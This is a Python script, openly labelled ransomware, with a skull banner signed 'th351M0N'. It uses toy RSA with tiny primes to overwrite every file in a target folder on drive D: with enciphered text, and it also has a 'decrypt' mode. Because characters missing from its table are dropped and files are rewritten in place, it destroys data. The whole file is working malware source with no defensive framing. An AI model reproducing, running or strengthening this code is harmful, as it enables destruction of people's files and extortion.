import os

class Ransomware:

    def __init__(self, public_key, private_key, p, q):
        self.e = public_key
        self.d = private_key
        self.p = p
        self.q = q
        self.n = self.p * self.q 
        self.phi = (self.p - 1) * (self.q - 1)
        self.alpha_dic = {}
        self.forbidder = [91, 92, 93, 40, 39, 41, 123, 125]

    def __skull__(self):
        print('                                                                        ')
        print('                                                                        ')
        print('                                                                        ')
        print('                                                 ********************   ')
        print('                                                **********************  ')
        print('                                               ************************ ')
        print('                                              **************************')
        print('                                              **************************')
        print('                                              **************************')
        print('                                              **************************')
        print('                                              **************************')
        print('                              **              ****  ******** ****** ****')
        print('                             ****             ***  ********* ***** *****')
        print('                             ****             **     ** ****  ***   *  *')
        print('                             ****             **        ********        ')
        print('                             ****             **        ******          ')
        print('                             ****             **        ******        **')
        print('                             ****             **        ******        **')
        print('                             ****             ***      *** ****      ***')
        print('                             ****             ***     ****  ****    ****')
        print('                             ****             ************  **********  ')
        print('                             **** ***         ************    *******   ')
        print('                           **********             ******        ***     ')
        print('                          *** *** *****            ******     ** **     ')
        print('                          *** *** ** ***            ****** *****  *     ')
        print('                          *** *** ** ***            ** **** ****        ')
        print('                  ******* * * *** ** ***            **  *** ****        ')
        print('                 *********** ****  ** **                *******         ')
        print('                 ************************          ****   ********      ')
        print('                        ****************           ****        ***      ')
        print('                          *************              **        *** **   ')
        print('                             *********               **   ********  *   ')
        print('                            ** ***** *                ***********       ')
        print('                           ****     ***                *********        ')
        print('                            ***********                 *******         ')
        print('                             * ***** **    ____  ____  ____  ____  ____  ____  ____  ____ ')
        print('                            ***     **    ||S ||||I ||||N ||||I ||||S ||||T ||||E ||||R ||')
        print('                            *********     ||__||||__||||__||||__||||__||||__||||__||||__||')
        print('                             *******      |/__\||/__\||/__\||/__\||/__\||/__\||/__\||/__\|')
        print('                              ****   ____  ____  ____  ____  ____  ____  ____  ____  ____  ____ ')
        print('                               * *  ||E ||||N ||||C ||||R ||||Y ||||P ||||T ||||I ||||o ||||n ||')
        print('                              *   * ||__||||__||||__||||__||||__||||__||||__||||__||||__||||__||')
        print('                               ***  |/__\||/__\||/__\||/__\||/__\||/__\||/__\||/__\||/__\||/__\|')
        print(' ')
        print('                                                                                          -by th351M0N')

    def __build_dic_table__(self):
        i = 0
        pointer = 0
        while(i < 95):
            if i + 32 not in self.forbidder: 
                self.alpha_dic[chr(i + 32)] = pointer
                pointer += 1
            i += 1

    def __conversion__(self, st):
        main_string_list = [0] * len(st)
        main_string_list = [self.alpha_dic[st[i]] for i in range(len(st)) if st[i] in self.alpha_dic]
        return main_string_list

    def __gcd__(self, x, y):
        if x == 0:
            return y
        else:
            return self.__gcd__(y % x, x)

    def __encrytption__(self, st):
        st_to_num_conv = self.__conversion__(st)
        en_string_list = [0] * len(st_to_num_conv)
        bool = self.__gcd__(self.e, self.phi)
        if bool != 1:
            print("Wrong p, q or publc key selection")
        else:
            en_string_list = [(st_to_num_conv[i] ** self.e) % self.n  for i in range(len(st_to_num_conv))]
            en_num, en_st = self.__list_to_string__(en_string_list)
            return en_num, en_st

    def __euler_extend__(self, phi1, phi2, e, d):
        if e == 1:
            return d
        else:
            div = phi1 // e
            a, b = e * div, d * div
            x, y = phi1 - a, phi2 - b
            if x < 0:
                x = x % self.phi
            if y < 0:
                y = y % self.phi
            return self.__euler_extend__(e, d, x, y)

    def __decryption__(self, st):
        st_to_num_conv = self.__conversion__(st)
        de_string_list = [0] * len(st_to_num_conv)
        self.d = self.__euler_extend__(self.phi, self.phi, self.e, 1)
        de_string_list = [(st_to_num_conv[i] ** self.d) % self.n for i in range(len(st_to_num_conv))]
        de_num, de_st = self.__list_to_string__(de_string_list)
        return de_num, de_st

    def __list_to_string__(self, list):
        num, st = '', ''
        for i in list:
            num += str(i)
            st += [j for j in self.alpha_dic if self.alpha_dic[j] == i][0]
        return num, st


if __name__ == "__main__":
    inst = Ransomware(public_key=5, private_key=0, p=3, q=29)
    inst.__build_dic_table__()
    print(f'Location of the Ransomeware {os.getcwd()}')
    os.chdir('D:')
    target = str(input("Name Your Target: "))

    bool = False
    for dirpath, dirname, filename in os.walk(os.getcwd()):
        if target in filename:
            path = dirpath
            bool = True

    if bool:
        print(f'Target Loaction in This Folder: {path}')
        os.chdir(path)
        files = []
        for file in os.listdir():
            if file == 'ransomeware.py':
                continue
            if os.path.isfile(file):
                files.append(file)

        print(f'These Files: {files} are Found Inside Target Directory')
        will = int(input("Encrypt: 1\nDecrypt: 0\nWhat Do You Want with Your Target? : "))

        if will:
            for file in files:
                with open(file, 'r') as f:
                    lines = f.readlines()
                              
                new_lines = [line.rstrip() for line in lines]
                en_lines = []
                for line in new_lines:
                    what_you_want_encrypt = line
                    encypted_result_num, encypted_result_string = inst.__encrytption__(what_you_want_encrypt)
                    en_lines.append(encypted_result_string)
                
                with open(file, 'w') as f:
                    pass

                with open(file, 'w') as f:
                    for line in en_lines:
                        f.write(line)
                        f.write('\n')
            inst.__skull__()
            print('Encryption Successful Master')
        else:
            for file in files:
                with open(file, 'r') as f:
                    lines = f.readlines()
                
                new_lines = [line.rstrip() for line in lines]
                de_lines = []
                for line in new_lines:
                    what_you_want_encrypt = line
                    decypted_result_num, decypted_result_string = inst.__decryption__(what_you_want_encrypt)
                    de_lines.append(decypted_result_string)
                
                with open(file, 'w') as f:
                    pass

                with open(file, 'w') as f:
                    for line in de_lines:
                        f.write(line)
                        f.write('\n')
            print('Master Has Shown Marcy on You') 
    else:
        print(f'{target} Has Not been found {os.getcwd()}')